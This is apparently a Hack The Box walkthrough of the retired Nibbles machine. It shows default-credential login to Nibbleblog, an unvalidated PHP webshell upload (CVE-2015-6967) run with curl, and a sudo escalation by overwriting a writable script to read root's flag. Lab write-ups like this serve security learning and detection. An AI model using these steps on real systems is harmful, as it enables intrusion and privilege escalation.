---
machine: Nibbles
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, nibbleblog, file-upload, cve-2015-6967, sudo]
---

# Nibbles — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

**Nibbleblog 4.0.3** under `/nibbleblog/` with default credentials. The "My Image" plugin **uploads files without validating the extension** (CVE-2015-6967), so a PHP file becomes a shell as `nibbler`. Escalation is `sudo` over a script the user can overwrite.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp  http  Apache httpd 2.4.18
```

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

`/nibbleblog/` shows up. The version is confirmed in `/nibbleblog/README` and at login:

```bash
curl -s http://<IP>/nibbleblog/admin/
curl -s http://<IP>/nibbleblog/content/private/users.xml
```

## Access

Login at `/nibbleblog/admin.php` with the defaults (`nibbles:nibbles`, matching the box name). If they fail, read `content/private/config.xml` and `users.xml`, often world-readable.

As admin:

1. Plugins → **My Image** → settings.
2. Upload a `.php` shell; the extension is not validated.
3. The file lands at `/nibbleblog/content/private/plugins/my_image/image.php`.

```bash
curl -s "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php?c=id"
# uid=1001(nibbler) ...
```

Reverse shell, then the user flag at `/home/nibbler/user.txt`.

## Escalation

```bash
sudo -l
```

```text
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The script lives in the home and is writable by `nibbler`, so replace it with one that copies the flag or spawns a shell:

```bash
cat > /home/nibbler/personal/stuff/monitor.sh <<'EOF'
#!/bin/bash
cp /root/root.txt /tmp/root.txt
chmod 644 /tmp/root.txt
EOF
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
cat /tmp/root.txt
```

## Lessons

- A CMS with default credentials and an unvalidated upload plugin is a two-step shell.
- CVE-2015-6967 still shows up on old installs: the CMS version is the key fact.
- `sudo` over a script the user can write is `sudo` over everything.
- Detection: POSTs to `admin.php` with a fresh session, `.php` files in `content/private/plugins`, and `monitor.sh` run through `sudo`.
